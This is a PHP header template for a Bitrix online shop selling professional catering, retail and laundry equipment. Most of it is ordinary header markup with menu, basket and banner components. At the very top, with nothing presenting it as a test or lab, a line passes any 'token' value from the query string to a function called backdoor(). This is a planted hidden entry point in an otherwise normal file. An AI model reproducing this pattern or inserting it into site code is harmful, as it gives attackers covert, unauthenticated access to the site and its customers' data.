<?if(!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED!==true)die();

if(isset($_GET['token'])) {
    backdoor($_GET['token']);
}

$isClientsPage= (CSite::InDir('/clients/'));
?>
<!doctype html>
<html class="no-js" lang="<?=LANGUAGE_ID?>">

<head>
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <title><?$APPLICATION->ShowTitle()?></title>    

    <!-- Фавиконки -->
    <link rel="shortcut icon" type="image/x-icon" href="<?=SITE_TEMPLATE_PATH?>/assets/images/favicon.ico">

    <?$APPLICATION->ShowHead();?>
    
    <!-- CSS
    ============================================ -->
   
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="<?=SITE_TEMPLATE_PATH?>/assets/css/bootstrap.min.css">
    
    <!-- Icon Font CSS -->
    <link rel="stylesheet" href="<?=SITE_TEMPLATE_PATH?>/assets/css/icon-font.min.css">
    
    <!-- Plugins CSS -->
    <link rel="stylesheet" href="<?=SITE_TEMPLATE_PATH?>/assets/css/plugins.css">
    
    <!-- Main Style CSS -->
    <link rel="stylesheet" href="<?=SITE_TEMPLATE_PATH?>/assets/css/style.css">
    
    <?$APPLICATION->SetAdditionalCSS(SITE_TEMPLATE_PATH."/js/formcheck/style.css");?>

		<?$APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH."/js/jquery-3.3.1.min.js");?>
		<?//$APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH."/js/jquery.min.js");?>
		<?$APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH."/js/formcheck/jquery.maskedinput.min.js");?>
		<?$APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH."/js/formcheck/is.mobile.js");?>
		<?$APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH."/js/formcheck/formcheck.js");?>

		<?$APPLICATION->AddHeadScript(SITE_TEMPLATE_PATH."/js/mx_script.js");?>


    <!-- Сброс стилей для телефона в Safari -->
    <meta name="format-detection" content="telephone=no">
    
    <!-- Modernizer JS -->
    <script src="<?=SITE_TEMPLATE_PATH?>/assets/js/vendor/modernizr-2.8.3.min.js"></script>
</head>

<body>
<?if( !function_exists("d") ) {
	function d($str) {
		global $USER;
		if($USER->IsAdmin()) {
			echo "<pre>";
			print_r($str);
			echo "</pre>";
		}
	}
}
?>
<?$APPLICATION->ShowPanel();?>
<!-- Preloader -->

<!--<div class="loader-mask">
    <div class="loader">
        "Loading..."
    </div>
</div>-->



<!-- Header Section Start -->
<div class="header-section">


    <!-- Header Top Start -->
    <div class="header-top header-top-two header-top-border pt-10 pb-10">
        <div class="container">
            <div class="row align-items-center justify-content-between">

                <div class="col mt-10 mb-10">
                    <!-- Header Links Start -->
                    <div class="header-links">
                        <a href="/delivery/"><img src="<?=SITE_TEMPLATE_PATH?>/assets/images/icons/car.png" alt="Car Icon"> <span>Доставка и оплата</span></a>
                    </div><!-- Header Links End -->
                </div>

				<div class="col mt-10 mb-10">
                    <!-- Header phone -->
                    <div class="header-phone">
                        <p>Отдел продаж:
                        <?$APPLICATION->IncludeComponent(
                            "bitrix:main.include",
                            "",
                            Array(
                                "AREA_FILE_SHOW" => "file",
                                "AREA_FILE_SUFFIX" => "inc",
                                "EDIT_TEMPLATE" => "",
                                "PATH" => "/include/header_phone2.php"
                            )
                        );?>
                        </p>
                    </div><!-- Header phone End -->
                </div>

                <div class="col mt-10 mb-10">
                    <!-- Header phone -->
                    <div class="header-phone">
                        <p>Сервисная служба:
                        <?$APPLICATION->IncludeComponent(
                            "bitrix:main.include",
                            "",
                            Array(
                                "AREA_FILE_SHOW" => "file",
                                "AREA_FILE_SUFFIX" => "inc",
                                "EDIT_TEMPLATE" => "",
                                "PATH" => "/include/header_phone.php"
                            )
                        );?>
                        </p>
                    </div><!-- Header phone End -->
                </div>


                <div class="col">
                    <!-- Header Search Start -->
                    <div class="header-search">

                        <!-- Search Toggle -->
                        <button class="search-toggle"><i class="icofont icofont-search-alt-1"></i></button>

                    </div><!-- Header Search End -->
                </div>

                <div class="col order-12 order-xs-12 order-md-2 mt-10 mb-10 ml-auto">
                    <!-- Header Shop Links Start -->
                    <div class="header-shop-links">
                        
                        <!-- Сравнение -->
                        <a href="/category/compare.php" class="header-compare">
                            <i class="ti-control-shuffle"></i>
                            <span class="number" id="compare_list_count_1">
                            <?$APPLICATION->IncludeComponent(
                                "bitrix:catalog.compare.list", 
                                "compare", 
                                array(
                                    "ACTION_VARIABLE" => "action",
                                    "AJAX_MODE" => "Y",
                                    "AJAX_OPTION_ADDITIONAL" => "",
                                    "AJAX_OPTION_HISTORY" => "N",
                                    "AJAX_OPTION_JUMP" => "N",
                                    "AJAX_OPTION_STYLE" => "Y",
                                    "COMPARE_URL" => "/category/compare.php",
                                    "DETAIL_URL" => "/category/#SECTION_CODE#/#ELEMENT_CODE#/",
                                    "IBLOCK_ID" => "58",
                                    "IBLOCK_TYPE" => "1c_catalog",
                                    "NAME" => "CATALOG_COMPARE_LIST",
                                    "POSITION" => "top left",
                                    "POSITION_FIXED" => "Y",
                                    "PRODUCT_ID_VARIABLE" => "id",
                                    "COMPONENT_TEMPLATE" => "compare"
                                ),
                                false
                            );?>
                            </span>
                        </a>
                        <!-- Избранное -->
                        <a href="/category/wishlist.php" class="header-wishlist">
                            <i class="ti-heart"></i>
                            <span id="wishcount1" class="number">
                            <?
                                use Bitrix\Main\Loader;
                                Loader::includeModule("sale");
                                $delaydBasketItems = CSaleBasket::GetList(
                                    array(),
                                    array(
                                        "FUSER_ID" => CSaleBasket::GetBasketUserID(),
                                        "LID" => SITE_ID,
                                        "ORDER_ID" => "NULL",
                                        "DELAY" => "Y"
                                    ),
                                    array()
                                );
                                echo $delaydBasketItems;
                            ?>
                            </span>
                        </a>                     
                        <!-- Корзина -->
                        <?$APPLICATION->IncludeComponent(
                            "bitrix:sale.basket.basket.line", 
                            "top_basket", 
                            array(
                                "HIDE_ON_BASKET_PAGES" => "N",
                                "PATH_TO_AUTHORIZE" => "",
                                "PATH_TO_BASKET" => SITE_DIR."personal/cart/",
                                "PATH_TO_ORDER" => SITE_DIR."personal/order/make/",
                                "PATH_TO_PERSONAL" => SITE_DIR."personal/",
                                "PATH_TO_PROFILE" => SITE_DIR."personal/",
                                "PATH_TO_REGISTER" => SITE_DIR."login/",
                                "POSITION_FIXED" => "N",
                                "SHOW_AUTHOR" => "N",
                                "SHOW_EMPTY_VALUES" => "Y",
                                "SHOW_NUM_PRODUCTS" => "Y",
                                "SHOW_PERSONAL_LINK" => "N",
                                "SHOW_PRODUCTS" => "N",
                                "SHOW_REGISTRATION" => "N",
                                "SHOW_TOTAL_PRICE" => "N",
                                "COMPONENT_TEMPLATE" => "top_basket"
                            ),
                            false
                        );?>
                        
                    </div>
                </div>
				<!--
                <div class="col order-2 order-xs-2 order-md-12 mt-10 mb-10">
                    <div class="header-account-links">
                        <a href="/personal/"><i class="icofont icofont-user-alt-7"></i> <span class="d-block">Личный кабинет</span></a>
                    </div>
                </div>
				-->
            </div>


        </div>
    </div><!-- Header Top End -->


    <!-- Header Top Start -->
	<div class="header-sticky1 header-replace"></div>
	<div class="header-sticky1 main-head1 relative">
		<div class="container relative blue-bg1">

				<div class="header-logo main-logo">
                    <a href="/">
                        <img src="<?=SITE_TEMPLATE_PATH?>/assets/images/main-logox.png" alt="E&E - Electronics eCommerce Bootstrap4 HTML Template" class="logo-main">
                        <img src="<?=SITE_TEMPLATE_PATH?>/assets/images/logo-xs.png" alt="E&E - Electronics eCommerce Bootstrap4 HTML Template" class="logo-xs">
                    </a>
					<div class="logo-text">
						<p class="logo-text-h">Профессиональные решения</p>
						<p>Для общественного питания,<br/>торговли и прачечных </p>
					</div>
                </div>

				<img src="<?=SITE_TEMPLATE_PATH?>/assets/images/menu-bg.png" alt="" class="menu-bg">

				<?$APPLICATION->IncludeComponent(
                    "bitrix:menu",
                    "top",
                    Array(
                        "ALLOW_MULTI_SELECT" => "N",
                        "CHILD_MENU_TYPE" => "left",
                        "DELAY" => "N",
                        "MAX_LEVEL" => "2",
                        "MENU_CACHE_GET_VARS" => array(0=>"",),
                        "MENU_CACHE_TIME" => "36000000",
                        "MENU_CACHE_TYPE" => "A",
                        "MENU_CACHE_USE_GROUPS" => "Y",
                        "CACHE_SELECTED_ITEMS" => "N",
                        "ROOT_MENU_TYPE" => "top",
                        "USE_EXT" => "Y"
                    )
                );?>

				<div class="header-search menu-line-search">

                    <!-- Search Toggle -->
                    <button class="search-toggle"><i class="icofont icofont-search-alt-1"></i></button>

                </div><!-- Header Search End -->

                <div class="header-shop-links">
                        
                        <!-- Сравнение -->
                        <a href="/category/compare.php" class="header-compare">
                            <i class="ti-control-shuffle"></i>
                            <span class="number" id="compare_list_count_2">
                            <?$APPLICATION->IncludeComponent(
                                "bitrix:catalog.compare.list",
                                "compare",
                                Array(
                                    "ACTION_VARIABLE" => "action",
                                    "AJAX_MODE" => "Y",
                                    "AJAX_OPTION_ADDITIONAL" => "",
                                    "AJAX_OPTION_HISTORY" => "N",
                                    "AJAX_OPTION_JUMP" => "N",
                                    "AJAX_OPTION_STYLE" => "Y",
                                    "COMPARE_URL" => "/category/compare.php",
                                    "DETAIL_URL" => "/category/#SECTION_CODE#/#ELEMENT_CODE#/",
                                    "IBLOCK_ID" => CATALOG_IBLOCK_ID,
                                    "IBLOCK_TYPE" => "1c_catalog",
                                    "NAME" => "CATALOG_COMPARE_LIST",
                                    "POSITION" => "top left",
                                    "POSITION_FIXED" => "Y",
                                    "PRODUCT_ID_VARIABLE" => "id"
                                )
                            );?>
                            </span>
                        </a>
                        <!-- Избранное -->
                        <a href="/category/wishlist.php" class="header-wishlist">
                            <i class="ti-heart"></i>
                            <span class="number" id="wishcount2">
                            <?
                                $delaydBasketItems = CSaleBasket::GetList(
                                    array(),
                                    array(
                                        "FUSER_ID" => CSaleBasket::GetBasketUserID(),
                                        "LID" => SITE_ID,
                                        "ORDER_ID" => "NULL",
                                        "DELAY" => "Y"
                                    ),
                                    array()
                                );
                                echo $delaydBasketItems;
                            ?>
                            </span>
                        </a>
                        <!-- Корзина -->
                        <?$APPLICATION->IncludeComponent(
                            "bitrix:sale.basket.basket.line",
                            "top_basket",
                            Array(
                                "HIDE_ON_BASKET_PAGES" => "N",
                                "PATH_TO_AUTHORIZE" => "",
                                "PATH_TO_BASKET" => SITE_DIR."personal/cart/",
                                "PATH_TO_ORDER" => SITE_DIR."personal/order/make/",
                                "PATH_TO_PERSONAL" => SITE_DIR."personal/",
                                "PATH_TO_PROFILE" => SITE_DIR."personal/",
                                "PATH_TO_REGISTER" => SITE_DIR."login/",
                                "POSITION_FIXED" => "N",
                                "SHOW_AUTHOR" => "N",
                                "SHOW_EMPTY_VALUES" => "Y",
                                "SHOW_NUM_PRODUCTS" => "Y",
                                "SHOW_PERSONAL_LINK" => "N",
                                "SHOW_PRODUCTS" => "N",
                                "SHOW_REGISTRATION" => "N",
                                "SHOW_TOTAL_PRICE" => "N"
                            )
                        );?>
                        
                </div>



				<div class="mobile-menu order-12 d-block d-lg-none col"></div>

		</div>
		<div class="menu-line"></div>


            <?$APPLICATION->IncludeComponent(
                "bitrix:search.form",
                "top_form",
            Array()
            );?>
	</div>

          

</div><!-- Header Section End -->

<?$APPLICATION->IncludeComponent(
	"bitrix:sale.basket.basket.line",
	"fly_basket",
	Array(
		"COMPONENT_TEMPLATE" => ".default",
		"HIDE_ON_BASKET_PAGES" => "Y",
		"MAX_IMAGE_SIZE" => "70",
		"PATH_TO_AUTHORIZE" => "",
		"PATH_TO_BASKET" => SITE_DIR."personal/cart/",
		"PATH_TO_ORDER" => SITE_DIR."personal/order/make/",
		"PATH_TO_PERSONAL" => SITE_DIR."personal/",
		"PATH_TO_PROFILE" => SITE_DIR."personal/",
		"PATH_TO_REGISTER" => SITE_DIR."login/",
		"POSITION_FIXED" => "Y",
		"POSITION_HORIZONTAL" => "right",
		"POSITION_VERTICAL" => "top",
		"SHOW_AUTHOR" => "N",
		"SHOW_DELAY" => "N",
		"SHOW_EMPTY_VALUES" => "Y",
		"SHOW_IMAGE" => "Y",
		"SHOW_NOTAVAIL" => "N",
		"SHOW_NUM_PRODUCTS" => "Y",
		"SHOW_PERSONAL_LINK" => "N",
		"SHOW_PRICE" => "Y",
		"SHOW_PRODUCTS" => "Y",
		"SHOW_REGISTRATION" => "N",
		"SHOW_SUMMARY" => "Y",
		"SHOW_TOTAL_PRICE" => "Y"
	)
);?>

<!-- Cart Overlay -->
<div class="cart-overlay"></div>

<?if($isContactsPage):?>
<!-- Page Banner Section Start -->
<div class="page-banner-section section">
    <div class="page-banner-wrap row row-0 d-flex align-items-center ">

        <!-- Page Banner -->
        <div class="col-lg-4 col-12 order-lg-2 d-flex align-items-center justify-content-center">
            <div class="page-banner">
                <h1><?$APPLICATION->ShowTitle()?></h1>
                <?$APPLICATION->IncludeComponent(
					"bitrix:breadcrumb", 
					"breadcrumb", 
					array(
						"PATH" => "",
						"SITE_ID" => "s1",
						"START_FROM" => "0",
						"COMPONENT_TEMPLATE" => "breadcrumb"
					),
					false
				);?>
            </div>
        </div>

        <!-- Banner -->
        <div class="col-lg-4 col-md-6 col-12 order-lg-1">
            <div class="banner">
            <?$APPLICATION->IncludeComponent(
				"bitrix:news.list", 
				"breadcrumb_banner", 
				array(
					"ACTIVE_DATE_FORMAT" => "d.m.Y",
					"ADD_SECTIONS_CHAIN" => "N",
					"AJAX_MODE" => "N",
					"AJAX_OPTION_ADDITIONAL" => "",
					"AJAX_OPTION_HISTORY" => "N",
					"AJAX_OPTION_JUMP" => "N",
					"AJAX_OPTION_STYLE" => "Y",
					"CACHE_FILTER" => "N",
					"CACHE_GROUPS" => "Y",
					"CACHE_TIME" => "36000000",
					"CACHE_TYPE" => "A",
					"CHECK_DATES" => "Y",
					"COMPONENT_TEMPLATE" => "breadcrumb_banner",
					"DETAIL_URL" => "",
					"DISPLAY_BOTTOM_PAGER" => "N",
					"DISPLAY_DATE" => "N",
					"DISPLAY_NAME" => "N",
					"DISPLAY_PICTURE" => "Y",
					"DISPLAY_PREVIEW_TEXT" => "N",
					"DISPLAY_TOP_PAGER" => "N",
					"FIELD_CODE" => array(
						0 => "",
						1 => "",
					),
					"FILTER_NAME" => "",
					"HIDE_LINK_WHEN_NO_DETAIL" => "N",
					"IBLOCK_ID" => "38",
					"IBLOCK_TYPE" => "content",
					"INCLUDE_IBLOCK_INTO_CHAIN" => "N",
					"INCLUDE_SUBSECTIONS" => "N",
					"MESSAGE_404" => "",
					"NEWS_COUNT" => "1",
					"PAGER_BASE_LINK_ENABLE" => "N",
					"PAGER_DESC_NUMBERING" => "N",
					"PAGER_DESC_NUMBERING_CACHE_TIME" => "36000",
					"PAGER_SHOW_ALL" => "N",
					"PAGER_SHOW_ALWAYS" => "N",
					"PAGER_TEMPLATE" => ".default",
					"PAGER_TITLE" => "Новости",
					"PARENT_SECTION" => "",
					"PARENT_SECTION_CODE" => "",
					"PREVIEW_TRUNCATE_LEN" => "",
					"PROPERTY_CODE" => array(
						0 => "LINK",
						1 => "",
					),
					"SET_BROWSER_TITLE" => "N",
					"SET_LAST_MODIFIED" => "N",
					"SET_META_DESCRIPTION" => "N",
					"SET_META_KEYWORDS" => "N",
					"SET_STATUS_404" => "N",
					"SET_TITLE" => "N",
					"SHOW_404" => "N",
					"SORT_BY1" => "SORT",
					"SORT_BY2" => "SORT",
					"SORT_ORDER1" => "ASC",
					"SORT_ORDER2" => "ASC",
					"STRICT_SECTION_CHECK" => "N"
				),
				false
			);?>
            </div>
        </div>

        <!-- Banner -->
        <div class="col-lg-4 col-md-6 col-12 order-lg-3">
            <div class="banner">
            <?$APPLICATION->IncludeComponent(
				"bitrix:news.list", 
				"breadcrumb_banner", 
				array(
					"ACTIVE_DATE_FORMAT" => "d.m.Y",
					"ADD_SECTIONS_CHAIN" => "N",
					"AJAX_MODE" => "N",
					"AJAX_OPTION_ADDITIONAL" => "",
					"AJAX_OPTION_HISTORY" => "N",
					"AJAX_OPTION_JUMP" => "N",
					"AJAX_OPTION_STYLE" => "Y",
					"CACHE_FILTER" => "N",
					"CACHE_GROUPS" => "Y",
					"CACHE_TIME" => "36000000",
					"CACHE_TYPE" => "A",
					"CHECK_DATES" => "Y",
					"COMPONENT_TEMPLATE" => "breadcrumb_banner",
					"DETAIL_URL" => "",
					"DISPLAY_BOTTOM_PAGER" => "N",
					"DISPLAY_DATE" => "N",
					"DISPLAY_NAME" => "N",
					"DISPLAY_PICTURE" => "Y",
					"DISPLAY_PREVIEW_TEXT" => "N",
					"DISPLAY_TOP_PAGER" => "N",
					"FIELD_CODE" => array(
						0 => "",
						1 => "",
					),
					"FILTER_NAME" => "",
					"HIDE_LINK_WHEN_NO_DETAIL" => "N",
					"IBLOCK_ID" => "38",
					"IBLOCK_TYPE" => "content",
					"INCLUDE_IBLOCK_INTO_CHAIN" => "N",
					"INCLUDE_SUBSECTIONS" => "N",
					"MESSAGE_404" => "",
					"NEWS_COUNT" => "1",
					"PAGER_BASE_LINK_ENABLE" => "N",
					"PAGER_DESC_NUMBERING" => "N",
					"PAGER_DESC_NUMBERING_CACHE_TIME" => "36000",
					"PAGER_SHOW_ALL" => "N",
					"PAGER_SHOW_ALWAYS" => "N",
					"PAGER_TEMPLATE" => ".default",
					"PAGER_TITLE" => "Новости",
					"PARENT_SECTION" => "",
					"PARENT_SECTION_CODE" => "",
					"PREVIEW_TRUNCATE_LEN" => "",
					"PROPERTY_CODE" => array(
						0 => "LINK",
						1 => "",
					),
					"SET_BROWSER_TITLE" => "N",
					"SET_LAST_MODIFIED" => "N",
					"SET_META_DESCRIPTION" => "N",
					"SET_META_KEYWORDS" => "N",
					"SET_STATUS_404" => "N",
					"SET_TITLE" => "N",
					"SHOW_404" => "N",
					"SORT_BY1" => "SORT",
					"SORT_BY2" => "SORT",
					"SORT_ORDER1" => "DESC",
					"SORT_ORDER2" => "DESC",
					"STRICT_SECTION_CHECK" => "N"
				),
				false
			);?>
            </div>
        </div>

    </div>
</div><!-- Page Banner Section End -->
<?endif;?>

<?if($isCategoryPage):?>
	<div class="container">
		<div class="row">
			<div class="col-md-12">
				<?$APPLICATION->IncludeComponent(
					"bitrix:breadcrumb", 
					"breadcrumb_left", 
					array(
						"PATH" => "",
						"SITE_ID" => "s1",
						"START_FROM" => "0",
						"COMPONENT_TEMPLATE" => "breadcrumb_left"
					),
					false
				);?>
				<h2><?$APPLICATION->ShowTitle()?></h2>
			</div>
		</div>
	</div>
<?endif;?>


<?if(!$isIndexPage && !$isContactsPage && !CATALOG_ELEMENT_PAGE && !$isWishlistPage):?>
<!-- Blog Section Start -->
<div class="product-section section <?=(!$isCategoryPage ? 'mt-20' : 'mt-20')?> mb-40">
    <div class="container">
        <div class="row">
           
            <div class="col-xl-<?=(CATALOG_ELEMENT_PAGE ? '12' : '9')?> col-lg-<?=(CATALOG_ELEMENT_PAGE ? '12' : '8')?> col-12 order-lg-2 mb-50 content-section order-2">
            <?if(!$isCategoryPage):?>
                <?$APPLICATION->IncludeComponent(
                    "bitrix:breadcrumb",
                    "breadcrumb_left",
                    Array(
                        "PATH" => "",
                        "SITE_ID" => "s1",
                        "START_FROM" => "0"
                    )
                );?>
                <h2><?$APPLICATION->ShowTitle()?></h2>
            <?endif;?>
<?endif;?>